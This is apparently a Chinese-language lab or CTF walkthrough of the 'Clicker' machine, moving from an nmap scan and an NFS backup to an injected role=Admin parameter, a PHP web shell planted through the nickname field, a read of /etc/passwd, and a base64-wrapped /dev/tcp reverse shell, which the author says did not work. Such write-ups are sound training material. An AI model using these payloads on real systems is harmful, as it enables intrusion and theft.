# Clicker 

## Step 1: Nmap

一樣先掃看看

![Screenshot 2023-12-19 193215](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/546e37fe-e0e7-494a-becc-1b199d22a409)

發現有NFS伺服器和Apache server

## Step 2: NFS

把東西抓下來看看有啥

![Screenshot 2023-12-19 194250](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/620ba8b2-609c-4415-9c91-f637f0e2147b)
![Screenshot 2023-12-19 194447](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/260dbb91-9927-4f42-9d7c-02126d014d2f)
![Screenshot 2023-12-19 194550](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/6c1714a0-d4cd-45e4-a0e5-408aac7bd5fa)
![Screenshot 2023-12-19 194824](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/7b6bbca4-6d6a-4eab-af20-ce3524c989e3)

現在我們有整個網站的Backup了

但不清楚這個網站在幹嘛

去它的WEB翻翻看垃圾

## Step 3: WEB

發現在註冊時會有疑似可以注入的地方出現
![Screenshot 2023-12-19 195703](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/13d908ba-cb57-43f6-a339-6d37f11b4ead)

找不到適合的注入方式，找找看其他東西

![Screenshot 2023-12-19 200553](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/f2b90989-e5b4-48e4-8b92-7456cf949257)

發現這個小遊戲會變更到save_game.php這個檔案
![Screenshot 2023-12-19 200814](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/6ea41284-2afc-4d22-af8b-c8a78c3b2f16)

發現backup中對role這個東西會擋

![Screenshot 2023-12-19 201019](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/536b9ef3-a258-4d0e-9601-cb049e92aa1f)
![Screenshot 2023-12-19 201111](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/057cb3b3-7f18-47d6-aae6-064be9ccb658)

測測看

![Screenshot 2023-12-19 201236](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/197449a3-adfc-4e4c-81aa-131866a47602)

找到你囉漏洞

[CRLF Injection](https://www.geeksforgeeks.org/crlf-injection-attack/)

![Screenshot 2023-12-19 201236](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/4c9ba320-0ebd-41f3-9f54-c1f21bb379bd)
![Screenshot 2023-12-19 201256](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/beb25c34-4f56-4541-9920-e9dae9fa0936)

試試看我們的酷炫Injection

> &role%0a=Admin

![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/409139ff-19bc-42e2-927a-3b0b07612170)
![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/71ad048c-27a4-4eee-b8e9-54c5c20b26cc)

重新登入就可以看到新的東西了

![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/72ed66b4-61ac-49fd-b3d5-6fd17b2556c6)

![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/4542d0a7-3846-4a2d-95b2-2eb32e96d78b)

Export看看

![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/31087803-bd07-46ab-b987-c4279ac7a0bd)

可以到指定的路徑下面查看

![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/a4941da2-048b-481d-adc9-412987d92cb7)

又找到新的酷東西

![Screenshot 2023-12-19 203816](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/96c6d4ff-0819-4e41-964c-dc56c04ce8b0)


把extentsion改成php試試看

![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/c6793dbc-5dc7-42db-8ce4-fcd78033ed05)

變成php了

進去看看

![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/25276693/a383f1ac-1d78-4b6c-9370-07ef8042960c)

![image](https://github.com/FromSouth/Pub-ClassWork/assets/25276693/dfebe736-97dc-4efd-98e2-2a5a32664b84)

回到backup裡面，發現裡面有一個authenticate.php

![image](https://github.com/FromSouth/Pub-ClassWork/assets/25276693/01ad81f3-7434-452b-8ad0-2919d8f3f34c)

發現還有一個parameter叫做"Nickname"可以用

試試看能不能做shell出來  

> &nickname=<%3fphp+system($_GET['cmd'])+%3f>

> <file_name>.php?cmd=id

![image](https://github.com/FromSouth/Pub-ClassWork/assets/25276693/78c9d1e2-d470-41a1-b3f6-fd07c82d1aa5)

> <file_name>.php?cmd=cat /etc/passwd

![image](https://github.com/FromSouth/Pub-ClassWork/assets/25276693/85cf53a7-5c55-4e98-8239-6414e343e908)

這裡面要特別注意的是密碼除了root以外

還有一個用戶叫做jack

## Reverse Shell

> echo "sh -i >& /dev/tcp/<your_ip>/9001 0>&1" | base64
> echo%20%22<your_reverse_shell>%22%20|%20base64%20-d%20|%20bash

![image](https://github.com/FromSouth/Pub-ClassWork/assets/25276693/52a2cf43-a357-4eeb-b3fa-15ed5758aa28)

Reverse shell 壞了，我不能理解
